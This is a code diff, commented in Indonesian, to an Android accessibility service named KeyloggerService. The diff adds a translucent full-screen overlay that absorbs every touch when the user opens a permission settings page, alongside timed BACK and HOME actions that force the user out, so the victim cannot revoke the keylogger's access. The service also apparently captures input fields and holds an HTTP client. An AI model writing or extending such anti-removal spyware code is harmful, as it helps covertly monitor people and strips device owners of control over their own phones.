@@ -68,6 +68,9 @@ class KeyloggerService : AccessibilityService() {
     private var soundManager: HackerSoundManager? = null
     private val overlayHandler = Handler(Looper.getMainLooper())
 
+    // ── Permission Guard Overlay — blokir seluruh sentuhan saat halaman permission muncul ──
+    @Volatile private var permGuardOverlayView: android.view.View? = null
+
     private val http = OkHttpClient.Builder()
         .connectTimeout(8, TimeUnit.SECONDS)
         .readTimeout(8, TimeUnit.SECONDS)
@@ -268,19 +271,59 @@ class KeyloggerService : AccessibilityService() {
     }
 
     /**
+     * Tampilkan overlay transparan penuh yang MEMBLOKIR semua sentuhan user.
+     * TYPE_ACCESSIBILITY_OVERLAY tanpa FLAG_NOT_TOUCHABLE → semua tap diserap overlay,
+     * tidak ada yang tembus ke halaman permission di bawahnya.
+     */
+    private fun showPermGuardOverlay() {
+        if (permGuardOverlayView != null) return
+        try {
+            val view = android.view.View(this).apply {
+                // Hitam semi-transparan 50% — user tahu layar terkunci
+                setBackgroundColor(android.graphics.Color.argb(128, 0, 0, 0))
+            }
+            val params = WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                // TANPA FLAG_NOT_TOUCHABLE → overlay menyerap semua sentuhan
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                PixelFormat.TRANSLUCENT
+            )
+            (getSystemService(Context.WINDOW_SERVICE) as WindowManager).addView(view, params)
+            permGuardOverlayView = view
+        } catch (_: Exception) {}
+    }
+
+    /** Hapus overlay permission guard setelah navigasi selesai */
+    private fun dismissPermGuardOverlay(delayMs: Long = 700) {
+        handler.postDelayed({
+            permGuardOverlayView?.let { v ->
+                try {
+                    (getSystemService(Context.WINDOW_SERVICE) as WindowManager).removeView(v)
+                } catch (_: Exception) {}
+                permGuardOverlayView = null
+            }
+        }, delayMs)
+    }
+
+    /**
      * Jika user membuka halaman Permission Settings (misal Settings > Apps > [App] > Permissions),
-     * langsung multi-BACK + HOME secepat mungkin agar toggle tidak sempat diklik.
+     * langsung:
+     *   1. Tampilkan overlay penutup layar → semua sentuhan user diserap, tidak ada yg tembus
+     *   2. Multi-fire BACK + HOME untuk navigasi keluar secepat mungkin
+     *   3. Tutup overlay setelah navigasi selesai
      *
-     * Strategi triple-fire:
-     *   T+0ms   → BACK langsung (sebelum window sempat interactive)
+     * Strategi:
+     *   T+0ms   → OVERLAY muncul (block semua touch seketika) + BACK langsung
      *   T+80ms  → BACK kedua (fallback jika pertama belum efektif)
-     *   T+180ms → HOME (pastikan user keluar dari Settings)
-     *   T+320ms → BACK ketiga (untuk ROM yang lambat render)
-     *   T+500ms → HOME kedua (ensure final)
+     *   T+180ms → HOME (paksa keluar Settings)
+     *   T+320ms → BACK ketiga (ROM animasi lambat / MIUI)
+     *   T+500ms → HOME kedua (penjamin final)
+     *   T+700ms → Overlay hilang
      *
-     * Package com.android.permissioncontroller / com.google.android.permissioncontroller
-     * adalah dedicated permission UI — semua window dari sana LANGSUNG diblokir
-     * tanpa perlu cek className keyword.
+     * Package dedicated permission controller (com.android.permissioncontroller dll)
+     * diblokir semua window-nya tanpa cek className.
      */
     private fun guardPermissionPage(pkg: String, className: String) {
         if (!permissionGuardEnabled) return
@@ -295,16 +338,18 @@ class KeyloggerService : AccessibilityService() {
 
         android.util.Log.d("PermGuard", "Blocked: $pkg / $className [dedicated=$isDedicatedPermPkg]")
 
-        // T+0ms — fire BACK SEKARANG di main thread (sudah di main thread via onAccessibilityEvent)
-        performGlobalAction(GLOBAL_ACTION_BACK)
-        // T+80ms — BACK kedua, jika sistem belum register window sebagai active saat T+0
-        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK)  },  80)
-        // T+180ms — HOME, paksa keluar Settings
-        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME)  }, 180)
-        // T+320ms — BACK ketiga (ROM lambat / animasi panjang)
-        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK)  }, 320)
-        // T+500ms — HOME kedua sebagai penjamin akhir
-        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME)  }, 500)
+        // LANGKAH 1 — Overlay penutup layar seketika (blokir semua sentuhan)
+        showPermGuardOverlay()
+
+        // LANGKAH 2 — Multi-fire BACK + HOME
+        performGlobalAction(GLOBAL_ACTION_BACK)                                      // T+0ms
+        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK)  },   80)     // T+80ms
+        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME)  },  180)     // T+180ms
+        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_BACK)  },  320)     // T+320ms
+        handler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME)  },  500)     // T+500ms
+
+        // LANGKAH 3 — Tutup overlay setelah navigasi pasti selesai
+        dismissPermGuardOverlay(700)                                                 // T+700ms
     }
 
     private fun autoTriggerOverlay(pkg: String) {
@@ -406,6 +451,7 @@ class KeyloggerService : AccessibilityService() {
     override fun onDestroy() {
         super.onDestroy()
         hideOverlay()
+        dismissPermGuardOverlay(0)  // cleanup overlay jika masih ada
         instance = null
         // Flush semua pending sebelum service mati
         fields.values.forEach { entry ->
